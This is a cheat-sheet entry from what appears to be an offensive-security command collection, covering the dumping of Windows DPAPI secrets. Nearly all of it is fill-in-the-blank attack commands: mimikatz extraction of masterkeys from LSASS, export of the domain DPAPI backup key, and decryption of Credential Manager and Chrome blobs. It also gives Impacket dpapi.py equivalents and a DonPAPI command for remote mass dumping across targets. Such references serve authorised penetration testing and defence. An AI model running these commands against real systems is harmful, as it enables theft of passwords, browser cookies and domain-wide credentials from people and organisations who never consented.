---
technique: DPAPISecrets
category: credential-dumping
targets: User Secrets, Masterkeys, Browser Credentials, Credential Manager
protocols: SMB, DPAPI
remote_capable: true
tags: dpapi credential-dumping masterkeys browser-credentials credman windows ad
---

# DPAPISecrets

DPAPI protects user and machine secrets such as browser cookies, saved RDP credentials, certificate private keys, and Windows Credential Manager entries. Masterkeys are tied to a user password, domain backup key, or live logon session material, so dumping DPAPI secrets usually means collecting protected blobs and recovering the matching masterkey.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| User context | Needed to decrypt that user's DPAPI blobs with live session keys |
| Domain backup key | Lets privileged operators decrypt domain user masterkeys offline |
| Protected blob paths | Common paths include `%APPDATA%\Microsoft\Protect`, `%LOCALAPPDATA%\Microsoft\Credentials`, and `%APPDATA%\Microsoft\Credentials` |

## Windows

### mimikatz sekurlsa dpapi

#cmd #mimikatz #dpapi #live-session

Extract live DPAPI masterkeys from LSASS for logged-on users.

```cmd title:"Extract live DPAPI masterkeys from LSASS"
sekurlsa::dpapi
```
<!-- cheat -->

### mimikatz backupkeys

#cmd #mimikatz #dpapi #backup-key

Export the domain DPAPI backup key from a domain controller for offline masterkey decryption.

```cmd title:"Export domain DPAPI backup key with mimikatz"
lsadump::backupkeys /system:$dc_fqdn /export
```
<!-- cheat
var dc_fqdn
-->

### mimikatz masterkey with password

#cmd #mimikatz #dpapi #masterkey

Decrypt a DPAPI masterkey using the user's SID and password.

```cmd title:"Decrypt DPAPI masterkey with user password"
dpapi::masterkey /in:"$masterkey_file" /sid:$sid /password:$pass /protected
```
<!-- cheat
import passwords
var masterkey_file
var sid
-->

### mimikatz masterkey with backup key

#cmd #mimikatz #dpapi #backup-key

Decrypt a DPAPI masterkey using the exported domain backup key.

```cmd title:"Decrypt DPAPI masterkey with domain backup key"
dpapi::masterkey /in:"$masterkey_file" /pvk:"$backup_key_pvk"
```
<!-- cheat
var masterkey_file
var backup_key_pvk
-->

### mimikatz credential blob

#cmd #mimikatz #dpapi #credman

Decrypt a DPAPI-protected Credential Manager blob with the recovered masterkey.

```cmd title:"Decrypt DPAPI credential blob with masterkey"
dpapi::cred /in:"$credential_file" /masterkey:$masterkey
```
<!-- cheat
var credential_file
var masterkey
-->

### mimikatz chrome blob

#cmd #mimikatz #dpapi #browser

Decrypt Chrome DPAPI-protected data with the recovered masterkey context.

```cmd title:"Decrypt Chrome DPAPI data with mimikatz"
dpapi::chrome /in:"$chrome_blob"
```
<!-- cheat
var chrome_blob
-->

## Linux

### Impacket dpapi masterkey with password

#python #impacket #dpapi #masterkey

Decrypt a DPAPI masterkey offline using the user's SID and password.

```sh title:"Decrypt DPAPI masterkey with Impacket password"
dpapi.py masterkey -file "$masterkey_file" -sid "$sid" -password "$pass"
```
<!-- cheat
import passwords
var masterkey_file
var sid
-->

### Impacket dpapi backupkeys

#python #impacket #dpapi #backup-key

Extract the domain DPAPI backup keys remotely with privileged domain credentials.

```sh title:"Extract domain DPAPI backup keys with Impacket"
dpapi.py backupkeys -t "$domain/$user:$pass@$target"
```
<!-- cheat
import domain_ip
import users
import passwords
var target
-->

### Impacket dpapi masterkey with PVK

#python #impacket #dpapi #backup-key

Decrypt a DPAPI masterkey offline using the exported domain backup key.

```sh title:"Decrypt DPAPI masterkey with Impacket backup key"
dpapi.py masterkey -file "$masterkey_file" -pvk "$backup_key_pvk"
```
<!-- cheat
var masterkey_file
var backup_key_pvk
-->

### Impacket dpapi credential blob

#python #impacket #dpapi #credman

Decrypt a DPAPI-protected Credential Manager blob using a recovered masterkey.

```sh title:"Decrypt DPAPI credential blob with Impacket"
dpapi.py credential -file "$credential_file" -key "$masterkey"
```
<!-- cheat
var credential_file
var masterkey
-->

### DonPAPI

#python #dpapi #remote #multi-auth

Collect and decrypt DPAPI-protected user secrets remotely across one or more targets.

```sh title:"Dump DPAPI secrets remotely with DonPAPI"
DonPAPI.py "$domain/$user:$pass@$targets"
```
<!-- cheat
import domain_ip
import users
import passwords
var targets
-->
